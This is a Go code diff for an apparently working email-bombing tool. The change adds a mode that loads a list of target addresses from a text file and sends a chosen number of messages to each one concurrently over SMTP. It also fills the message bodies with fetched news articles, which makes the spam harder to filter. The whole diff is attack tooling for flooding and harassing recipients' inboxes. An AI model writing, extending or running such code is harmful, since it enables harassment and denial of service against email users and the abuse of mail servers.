@@ -3,12 +3,14 @@ package bomber
 import (
 	"bufio"
 	"fmt"
+	"go_cli/fileutil"
 	"os"
 	"strconv"
 	"strings"
 	"sync"
 
 	"github.com/fatih/color"
+	"github.com/ncruces/zenity"
 	"github.com/schollz/progressbar/v3"
 	"gopkg.in/gomail.v2"
 )
@@ -61,7 +63,7 @@ func Bomber() {
 		if smtpCreds.Default {
 			fmt.Printf("err: %v\n", err)
 			fmt.Printf("smtpCreds: %v\n", smtpCreds)
-			fmt.Println("The default SMTP Credentials is dead :( Please use a custom SMTP.")
+			fmt.Println("The default SMTP Credentials is dead. Please use a custom SMTP.")
 		} else {
 			fmt.Printf("err: %v\n", err)
 		}
@@ -69,9 +71,30 @@ func Bomber() {
 	}
 	defer smtpConn.Close()
 
+	fmt.Print("is your target more than 1? Y/n :> ")
+	rawNumTarget, _ := reader.ReadString('\n')
+	numTarget := strings.ToLower(strings.TrimSpace(rawNumTarget))
 	var targetEmail string
-	fmt.Print("Enter the email to bomb :> ")
-	fmt.Scanln(&targetEmail)
+	var targetList []string
+	if strings.Contains(numTarget, "y") {
+		fmt.Println("Select your target list: ")
+		filePath, err := zenity.SelectFile(
+			zenity.FileFilters{
+				{Patterns: []string{"*.txt"}, CaseFold: false},
+			})
+		if err != nil {
+			fmt.Printf("err: %v\n", err)
+			return
+		}
+		targetList, err = fileutil.ReadFromFile(filePath)
+		if err != nil {
+			fmt.Printf("err: %v\n", err)
+			return
+		}
+	} else {
+		fmt.Print("Enter the email to bomb :> ")
+		fmt.Scanln(&targetEmail)
+	}
 	fmt.Print("Enter number of emails to send :> ")
 	numEmails, _ := reader.ReadString('\n')
 	numEmails = strings.TrimSpace(numEmails)
@@ -81,7 +104,6 @@ func Bomber() {
 	var wg sync.WaitGroup
 	var mutex sync.Mutex
 	msgOpts := gomail.NewMessage()
-	msgOpts.SetHeader("To", targetEmail)
 
 	successBar := progressbar.NewOptions(numBombs,
 		progressbar.OptionSetWriter(os.Stdout),
@@ -96,19 +118,6 @@ func Bomber() {
 			BarEnd:        "]",
 		}),
 	)
-	failsBar := progressbar.NewOptions(numBombs,
-		progressbar.OptionSetWriter(os.Stdout),
-		progressbar.OptionShowCount(),
-		progressbar.OptionEnableColorCodes(true),
-		progressbar.OptionSetDescription("Fails ->"),
-		progressbar.OptionSetTheme(progressbar.Theme{
-			Saucer:        "[red]=[reset]",
-			SaucerHead:    "[red]>[reset]",
-			SaucerPadding: " ",
-			BarStart:      "[",
-			BarEnd:        "]",
-		}),
-	)
 
 	fmt.Println("fetching news data...")
 	body, err := GetMsgContent()
@@ -116,41 +125,93 @@ func Bomber() {
 		fmt.Printf("err: %v\n", err)
 		return
 	}
-	color.New(color.FgGreen).Println("Fetch was successful.")
-	chunkSize := numBombs / maxWorkers
 
-	if numBombs%maxWorkers != 0 {
-		chunkSize++
+	if body.TotalResults > 0 {
+		color.New(color.FgGreen).Println("Fetch was successful.")
+	} else {
+		color.New(color.FgRed).Println("The api has reached it's limit.\nKindly visit newsapi.org to register a new account.\nGet the api key and restart the tool with the given api key.")
+		return
 	}
 
-	workingChan := make(chan []int, chunkSize)
-	articleChunks := make(chan Article, 1)
-	distSlice := make([]int, numBombs)
-	for i := 0; i < numBombs; i++ {
-		distSlice[i] = i
-	}
+	if len(targetList) == 0 {
+		msgOpts.SetHeader("To", targetEmail)
+		chunkSize := numBombs / maxWorkers
 
-	for i := 0; i < maxWorkers; i++ {
-		wg.Add(1)
-		go SendMail(articleChunks, workingChan, &wg, &mutex, &smtpConn, msgOpts, &smtpCreds, successBar, failsBar)
-	}
-
-	articles := body.Articles
-	for _, article := range articles {
-		articleChunks <- article
-	}
-	close(articleChunks)
-
-	for i := 0; i < numBombs; i += chunkSize {
-		end := i + chunkSize
-		if end > numBombs {
-			end = numBombs
+		if numBombs%maxWorkers != 0 {
+			chunkSize++
 		}
-		workingChan <- distSlice[i:end]
-	}
-	close(workingChan)
 
-	wg.Wait()
-	fmt.Println("\nall done!")
+		workingChan := make(chan []int, chunkSize)
+		articleChunks := make(chan Article, 1)
+		distSlice := make([]int, numBombs)
+		for i := 0; i < numBombs; i++ {
+			distSlice[i] = i
+		}
+
+		for i := 0; i < maxWorkers; i++ {
+			wg.Add(1)
+			go SingleBomb(articleChunks, workingChan, &wg, &mutex, &smtpConn, msgOpts, &smtpCreds, successBar)
+		}
+
+		articles := body.Articles
+		for _, article := range articles {
+			articleChunks <- article
+		}
+		close(articleChunks)
+
+		for i := 0; i < numBombs; i += chunkSize {
+			end := i + chunkSize
+			if end > numBombs {
+				end = numBombs
+			}
+			workingChan <- distSlice[i:end]
+		}
+		close(workingChan)
+	} else {
+		chunkSize := len(targetList) / maxWorkers
+
+		if len(targetList)%maxWorkers != 0 {
+			chunkSize++
+		}
+
+		emailChunks := make(chan []string, chunkSize)
+		articleChunks := make(chan Article, 1)
+
+		for i := 0; i < maxWorkers; i++ {
+			wg.Add(1)
+			go MultiTargetBomb(articleChunks, emailChunks, &wg, &mutex, &smtpConn, msgOpts, &smtpCreds, numBombs)
+		}
+
+		for i := 0; i < len(targetList); i += chunkSize {
+			end := i + chunkSize
+			if end > len(targetList) {
+				end = len(targetList)
+			}
+			emailChunks <- targetList[i:end]
+		}
+		close(emailChunks)
+
+		articles := body.Articles
+		go func() {
+			process := true
+			for process {
+				select {
+				case _, ok := <-articleChunks:
+					if !ok {
+						process = false
+					}
+				default:
+					for _, article := range articles {
+						articleChunks <- article
+					}
+				}
+			}
+		}()
+
+		wg.Wait()
+		close(articleChunks)
+		fmt.Println("\nall done!")
+		os.Exit(0)
+	}
 
 }
